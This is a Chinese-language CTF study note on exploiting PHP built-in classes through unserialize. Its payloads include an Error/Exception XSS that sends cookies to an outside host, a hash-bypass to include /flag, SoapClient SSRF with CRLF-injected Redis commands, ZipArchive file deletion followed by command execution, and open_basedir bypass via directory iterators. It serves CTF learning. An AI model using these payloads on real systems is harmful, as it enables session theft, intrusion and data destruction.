##  前言

之所以这个总结，极客大挑战的`SoEzunser`考到了php原生类来遍历目录

其实，在CTF题目中，可以利用php原生类来进行XSS,反序列化，SSRF，XXE和读文件的思路

通过遍历看一下php的内置类

```php
 <?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
} 
```

```php
Exception::__wakeup
Exception::__toString
ErrorException::__wakeup
ErrorException::__toString
Error::__wakeup
Error::__toString
CompileError::__wakeup
CompileError::__toString
ParseError::__wakeup
ParseError::__toString
TypeError::__wakeup
TypeError::__toString
ArgumentCountError::__wakeup
ArgumentCountError::__toString
ArithmeticError::__wakeup
ArithmeticError::__toString
DivisionByZeroError::__wakeup
DivisionByZeroError::__toString
Generator::__wakeup
ClosedGeneratorException::__wakeup
ClosedGeneratorException::__toString
DateTime::__wakeup
DateTime::__set_state
DateTimeImmutable::__wakeup
DateTimeImmutable::__set_state
DateTimeZone::__wakeup
DateTimeZone::__set_state
DateInterval::__wakeup
DateInterval::__set_state
DatePeriod::__wakeup
DatePeriod::__set_state
JsonException::__wakeup
JsonException::__toString
LogicException::__wakeup
LogicException::__toString
BadFunctionCallException::__wakeup
BadFunctionCallException::__toString
BadMethodCallException::__wakeup
BadMethodCallException::__toString
DomainException::__wakeup
DomainException::__toString
InvalidArgumentException::__wakeup
InvalidArgumentException::__toString
LengthException::__wakeup
LengthException::__toString
OutOfRangeException::__wakeup
OutOfRangeException::__toString
RuntimeException::__wakeup
RuntimeException::__toString
OutOfBoundsException::__wakeup
OutOfBoundsException::__toString
OverflowException::__wakeup
OverflowException::__toString
RangeException::__wakeup
RangeException::__toString
UnderflowException::__wakeup
UnderflowException::__toString
UnexpectedValueException::__wakeup
UnexpectedValueException::__toString
CachingIterator::__toString
RecursiveCachingIterator::__toString
SplFileInfo::__toString
DirectoryIterator::__toString
FilesystemIterator::__toString
RecursiveDirectoryIterator::__toString
GlobIterator::__toString
SplFileObject::__toString
SplTempFileObject::__toString
SplFixedArray::__wakeup
ReflectionException::__wakeup
ReflectionException::__toString
ReflectionFunctionAbstract::__toString
ReflectionFunction::__toString
ReflectionParameter::__toString
ReflectionType::__toString
ReflectionNamedType::__toString
ReflectionMethod::__toString
ReflectionClass::__toString
ReflectionObject::__toString
ReflectionProperty::__toString
ReflectionClassConstant::__toString
ReflectionExtension::__toString
ReflectionZendExtension::__toString
AssertionError::__wakeup
AssertionError::__toString
DOMException::__wakeup
DOMException::__toString
PDOException::__wakeup
PDOException::__toString
PDO::__wakeup
PDOStatement::__wakeup
SimpleXMLElement::__toString
SimpleXMLIterator::__toString
SoapClient::__call
SoapFault::__toString
SoapFault::__wakeup
CURLFile::__wakeup
mysqli_sql_exception::__wakeup
mysqli_sql_exception::__toString
PharException::__wakeup
PharException::__toString
Phar::__destruct
Phar::__toString
PharData::__destruct
PharData::__toString
PharFileInfo::__destruct
PharFileInfo::__toString
```

只需要注意一些常用的内置类

```
Error
Exception
SoapClient
DirectoryIterator
FilesystemIterator
SplFileObject
SimpleXMLElement
```

##  参考资料

[PHP 原生类的利用小结 ](https://whoamianony.top/2021/03/10/Web安全/PHP 原生类的利用小结/)

感谢师傅的总结

##  利用Error/Exception 内置类进行 XSS

###  Error内置类

使用条件:

- 适用于php7版本
- 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，可以尝试利用这个来做一个xss，直接利用xss来打。其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这也是挖洞的一种思路。

测试例子：

本地放一个error.php

```php
<?php
$a = unserialize($_GET['cmd']);
echo $a;
?> 
```

这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化

poc:

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

直接可以弹出xss，触发了xss漏洞

### Exception内置类

- 适用于php5、7版本
- 开启报错的情况下

原理是类似的

测试代码

```php
<?php
$a = unserialize($_GET['cmd']);
echo $a;
?> 
```

poc

```php
<?php
$a = new Exception("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

###  [BJDCTF 2nd]xss之光

首先进入题目中，我们找到git泄露拿到源码

```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```

这就是一个典型的反序列化函数，但是没有给出反序列化的类，我们无法构造pop链，只有利用php内置类来反序列化，加上一个echo，我们就可以利用`Error`内置类来`XSS`

payload

```
<?php
$poc = new Exception("<script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>
```

一般xss的题都是在cookie理里，所以我们利用XSS把cookie带出来

```php
/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

然后flag就在cookie中

##  使用 Error/Exception 内置类绕过哈希比较

Error和Exception这两个PHP内置类，但对他们不限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。

###  Error类

条件：php7.0.0

类介绍

```php
Error implements Throwable {
	/* 属性 */
	protected string $message ;
	protected int $code ;
	protected string $file ;
	protected int $line ;
	/* 方法 */
	public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
	final public getMessage ( ) : string
	final public getPrevious ( ) : Throwable
	final public getCode ( ) : mixed
	final public getFile ( ) : string
	final public getLine ( ) : int
	final public getTrace ( ) : array
	final public getTraceAsString ( ) : string
	public __toString ( ) : string
	final private __clone ( ) : void
}
```

**类属性：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数

**类方法：**

- [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
- [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
- [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
- [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
- [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
- [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
- [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
- [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
- [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
- [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

### Exception 类

条件：php5

类摘要

```php
Exception {
	/* 属性 */
	protected string $message ;
	protected int $code ;
	protected string $file ;
	protected int $line ;
	/* 方法 */
	public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
	final public getMessage ( ) : string
	final public getPrevious ( ) : Throwable
	final public getCode ( ) : mixed
	final public getFile ( ) : string
	final public getLine ( ) : int
	final public getTrace ( ) : array
	final public getTraceAsString ( ) : string
	public __toString ( ) : string
	final private __clone ( ) : void
}
```

**类属性：**

- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号

**类方法：**

- [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
- [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
- [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
- [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
- [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
- [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
- [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
- [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
- [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
- [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。

看看触发Error的__toString方法

测试代码

```php
<?php
$a = new Error("payload",1);
echo $a;
输出
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

下一个例子：

```php
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

输出

```php
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的

利用Error和Exception类的这一点可以绕过在PHP类中的哈希比较

###  [2020 极客大挑战]Greatphp

还是一样的，给出源码，就代码审计

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

```php
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
```

对于这个，我们常见的是利用数组绕过强类型，但是这个是在类中，不能使用数组，只有使用Error类。

md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString` 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法，刚才实验过，Error类中的`__toString`将类转换的字符串相等。

又存在preg_match，过滤了括号，无法调用函数，尝试`include "/flag"`,但是引号过滤了，我们可以使用`两次取反，自动获得字符串`的。(绕过引号，长知识了)

payload

```php
<?php

class SYCLOVER {
	public $syc;
	public $lover;
	public function __wakeup(){
		if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
		   if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
			   eval($this->syc);
		   } else {
			   die("Try Hard !!");
		   }
		   
		}
	}
}
$cmd='/flag';
$cmd=urlencode(~$cmd)
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
也可以用，也需要用两次取反
$str1 = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!".urldecode("%FF")."]?>";
$str = "?><?=include $_GET[1]?>"; 
*/
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>
```

这道题我想到能不能同用hex编码

```php
<?php
$cmd='/flag';
$cmd=bin2hex($cmd);
var_dump($cmd);
$cmd=hex2bin($cmd);
var_dump($cmd);
```

虽然最后也是String字符，但是我实验下没有成功。

我也想到一个payload,然后1来传参，但是也没成功

```
$str="?>"<?=include$_GET[1];?>"
```

## SoapClient类来进行SSRF

###  SoapClient类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类介绍

```php
SoapClient {
	/* 方法 */
	public __construct ( string|null $wsdl , array $options = [] )
	public __call ( string $name , array $args ) : mixed
	public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
	public __getCookies ( ) : array
	public __getFunctions ( ) : array|null
	public __getLastRequest ( ) : string|null
	public __getLastRequestHeaders ( ) : string|null
	public __getLastResponse ( ) : string|null
	public __getLastResponseHeaders ( ) : string|null
	public __getTypes ( ) : array|null
	public __setCookie ( string $name , string|null $value = null ) : void
	public __setLocation ( string $location = "" ) : string|null
	public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
	public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
}
```

该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而`__call`触发很简单，就是当对象访问不存在的方法的时候就会触发。

该类的构造函数如下：

```php
PHP
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
- 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间
```

直接利用SoapClient来进行SSRF

构造php

```php
<?php
$a = new SoapClient(null,array('location'=>'http://ip:10000/aaa', 'uri'=>'http://ip:10000'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

记得监听自己VPN上的端口
![请添加图片描述](https://img-blog.csdnimg.cn/052d4e595c2f4a31af6859457e966430.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)


但是当存在CRLF漏洞，我们就可以通过`user_agent`的参数伪造http头

运行后，监听界面就出现了伪造的http头

![请添加图片描述](https://img-blog.csdnimg.cn/f470fdddc476471d85f438538e078165.png)
这儿可以看看怎么利用伪造http头去构造redis命令

测试代码

```php
<?php
$target = 'http://ip:10000/';
$poc = "CONFIG SET dir /var/www/html";
$a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b); 
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0bd047f6a1934f67ba766f9caead2a7e.png)
伪造了redis命令，这样我们就可以用http协议去打redis了。

对于发送POST数据包，Content-Type 的值我们要设置为 application/x-www-form-urlencoded，而且Content-Length的值需要与post的数据长度一致。而且http头跟post数据中间间隔`\r\n\r\n`,其他间隔`\r\n`

```php
<?php
$target = 'http://ip:10000/';
$post_data = 'data=whoami';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
成功发送post数据包
![在这里插入图片描述](https://img-blog.csdnimg.cn/aadef2961318444aae058377664b913b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16)

###  bestphp’s revenge

也可以看看[ctfshow的web259](https://blog.csdn.net/unexpectedthing/article/details/121319348)

看看[feng师傅的wp](https://blog.csdn.net/rfrder/article/details/114445325)

##  使用 SimpleXMLElement 类进行 XXE

###  SimpleXMLElement类

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

官方文档中对SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下:

![image-20210118131857853](https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210118131900.png)



![image-20210118131957770](https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210118132000.png)

意味着，当我们将第三个参数`data_is_url`设置为true的话，我们就可以调用远程xml文件，实现xxe的攻击。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

###  SUCTF2018-Homework

可以看看[这个的wp](https://johnfrod.top/ctf/suctf-2018homework/)

## 使用 ZipArchive 类来删除文件

ZipArchive类可以对文件进行压缩与解压缩处理。

条件：php 5.20

常见的类方法

```php
ZipArchive::addEmptyDir：添加一个新的文件目录
ZipArchive::addFile：将文件添加到指定zip压缩包中
ZipArchive::addFromString：添加新的文件同时将内容添加进去
ZipArchive::close：关闭ziparchive
ZipArchive::extractTo：将压缩包解压
ZipArchive::open：打开一个zip压缩包
ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件
ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除
```

我们看看`ZipArchive::open`方法

```php
ZipArchive::open(string $filename, int $flags=0)
```

```
该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。

filename：要打开的ZIP存档的文件名。
flags：用于打开档案的模式。有以下几种模式：
ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
ZipArchive::CREATE：如果不存在则创建一个zip压缩包。
ZipArchive::RDONLY：只读模式打开压缩包。
ZipArchive::EXCL：如果压缩包已经存在，则出错。
ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。
注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8
```

也就是说我们可以通过ZipArchive直接调用open方法删除目标机上的文件

### 梦里花开牡丹亭

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include('shell.php');
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }

    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}
class login{
    public $file;
    public $filename;
    public $content;

    public function __construct($file,$filename,$content)
    {
        $this->file=$file;
        $this->filename=$filename;
        $this->content=$content;
    }
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            $this->file->open($this->filename,$this->content);
            die('login success you can to open shell file!');
        }
    }
}
class register{
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            die('success register admin');
        }else{
            die('please register admin ');
        }
    }
}
class Open{
    function open($filename, $content){
        if(!file_get_contents('waf.txt')){    // 当waf.txt没读取成功时才能得到flag
            shell($content);
        }else{
            echo file_get_contents($filename.".php");    // filename=php://filter/read=convert.base64-encode/resource=shell
        }
    }
}
if($_GET['a']!==$_GET['b']&&(md5($_GET['a']) === md5($_GET['b'])) && (sha1($_GET['a'])=== sha1($_GET['b']))){
    @unserialize(base64_decode($_POST['unser']));
}
```

这串代码就是一个简单的反序列化POC

首先我们需要利用`file_get_contents`来得到文件内容

我们先让`register`的值为admin，进入`$this->choice=new login($this->file,$this->filename,$this->content)`，进入login类后，我们需要让`username`=admin,`password`=admin，进入`$this->choice=new login($this->file,$this->filename,$this->content)`，一如既往的，我们让`file`的值为`open`，那么我们就可以调用open类的open方法，达到我们的目的。

构造poc(其他师傅的)

因为前面包含`shell.php`，首先读取shell.php的内容

```php
<?php
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }

    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}

class login{
    public $file;
    public $filename;   
    public $content;
}

class Open{
    function open($filename, $content){
    }
}
$poc = new Game();
$poc->username = "admin";
$poc->password = "admin";
$poc->register = "admin";
$poc->file = new Open();
$poc->filename = "php://filter/read=convert.base64-encode/resource=shell";
$poc->content = "xxx";
echo base64_encode(serialize($poc));
```

shell.php

```php
<?php
function shell($cmd){
    if(strlen($cmd)<10){
        if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/',$cmd)){
            die("NO");
        }else{
            return system($cmd);
        }
    }else{
        die('so long!');
    }
}
```

看到function`shell`，所以我们可以通过反序列化，来调用shell方法，然后执行`system`来命令执行

这儿遇到一个问题，open的方法，当waf.txt不存在时，我们才能调用shell方法，我们需要删除waf.txt,想到了原生类,且需要原生类中有open方法，去删除waf.txt.

遍历一个

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__wakeup',
            '__call',
            '__callStatic',
            'open'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}
```

找到了`ZipArchive::open`

如果设置flags参数的值为 `ZipArchive::OVERWRITE` 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。

```php
ZipArchive::open($filename, ZipArchive::OVERWRITE)
```

删除waf.txt的POC

```PHP
<?php
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }

    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}

class login{
    public $file;
    public $filename;   
    public $content;
}

class Open{
    function open($filename, $content){
    }
}
$poc = new Game();
$poc->username = "admin";
$poc->password = "admin";
$poc->register = "admin";
$poc->file = new ZipArchive();
$poc->filename = "waf.txt";
$poc->content = ZipArchive::OVERWRITE;//或者为8
echo base64_encode(serialize($poc));
```

删除后，我们直接构造命令执行，也需要绕过正则

我们这种只需要用`''`或者`\`来过滤即可

POC

```php
<?php
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }

    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}

class login{
    public $file;
    public $filename;   
    public $content;
}

class Open{
    function open($filename, $content){
    }
}
$poc = new Game();
$poc->username = "admin";
$poc->password = "admin";
$poc->register = "admin";
$poc->file = new Open();
$poc->filename = "xxx";
$poc->content = "n\l /flag";
echo base64_encode(serialize($poc));
```

##  PHP 原生文件操作类

###  SPL

SPL是php标准库

[PHP: SPL - Manual](https://www.php.net/manual/zh/book.spl.php)

```php
SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、Countable 和 SeekableIterator 等接口，它们用于以数组形式操作对象。同时，你还可以使用 RecursiveIterator、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、SplObserver、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率
```

###  遍历文件目录的类

- DirectoryIterator 类
- FilesystemIterator 类
- GlobIterator 类

####  DirectoryIterator 类

类介绍

```php
DirectoryIterator extends SplFileInfo implements SeekableIterator {
	/* 方法 */
	public __construct ( string $path )
	public current ( ) : DirectoryIterator
	public getATime ( ) : int
	public getBasename ( string $suffix = ? ) : string
	public getCTime ( ) : int
	public getExtension ( ) : string
	public getFilename ( ) : string
	public getGroup ( ) : int
	public getInode ( ) : int
	public getMTime ( ) : int
	public getOwner ( ) : int
	public getPath ( ) : string
	public getPathname ( ) : string
	public getPerms ( ) : int
	public getSize ( ) : int
	public getType ( ) : string
	public isDir ( ) : bool
	public isDot ( ) : bool
	public isExecutable ( ) : bool
	public isFile ( ) : bool
	public isLink ( ) : bool
	public isReadable ( ) : bool
	public isWritable ( ) : bool
	public key ( ) : string
	public next ( ) : void
	public rewind ( ) : void
	public seek ( int $position ) : void
	public __toString ( ) : string    // 以字符串形式获取文件名
	public valid ( ) : bool
}
```

会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 `__toString()` 方法，输出指定目录里面经过排序之后的第一个文件名

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;
```

遍历文件目录,直接对文件全部输出出来

```php
<?php
$dir=new DirectoryIterator("/");
foreach($dir as $f){
    echo($f.'<br>');
    //echo($f->__toString().'<br>');
}
```

也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：

> glob:// 协议用来查找匹配的文件路径模式

```
<?php
$dir=new DirectoryIterator("glob:///flag");
echo $dir;
```

#### FilesystemIterator 类

FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

都是一样的，我们就列举一个

测试代码

```php
<?php
$dir=new FilesystemIterator("/");
foreach($dir as $f){
    echo($f.'<br>');
    //echo($f->__toString().'<br>');
}
```

直接对文件目录全部输出出来。

#### GlobIterator类

GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径

类介绍

```php
GlobIterator extends FilesystemIterator implements SeekableIterator , Countable {
	/* 方法 */
	public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO )
	public count ( ) : int
	/* 继承的方法 */
	public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS )
	public FilesystemIterator::current ( ) : mixed
	public FilesystemIterator::getFlags ( ) : int
	public FilesystemIterator::key ( ) : string
	public FilesystemIterator::next ( ) : void
	public FilesystemIterator::rewind ( ) : void
	public FilesystemIterator::setFlags ( int $flags = ? ) : void
}
```

当我们使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;

<?php
$dir=new FilesystemIterator("/");
echo $dir;
```

其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 `__toString()` 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。

意思就是我们可以在`GlobIterator`中直接使用正则匹配路径来遍历目录

遍历目录全部文件

```php
<?php
$dir = $_GET['cmd'];
$a = new GlobIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// 不加__toString()也可,因为echo可以自动调用
}
?>
```

### 使用可遍历目录类绕过 open_basedir

关于绕过open_basedir()可以看看[这个文章](https://blog.csdn.net/Xxy605/article/details/120221577)

####  使用DirectoryIterator类

```php
<?php
$dir = $_GET['cmd'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// 不加__toString()也可,因为echo可以自动调用
}
?>
其中cmd=glob:///*

# payload一句话的形式:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

####  使用FilesystemIterator

```php
<?php
$dir = $_GET['whoami'];
$a = new FilesystemIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// 不加__toString()也可,因为echo可以自动调用
}
?>
其中cmd=glob:///*

# payload一句话的形式:
$a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

####  使用 GlobIterator 类

```php
<?php
$dir = $_GET['whoami'];
$a = new GlobIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// 不加__toString()也可,因为echo可以自动调用
}
?>
其中cmd=/*

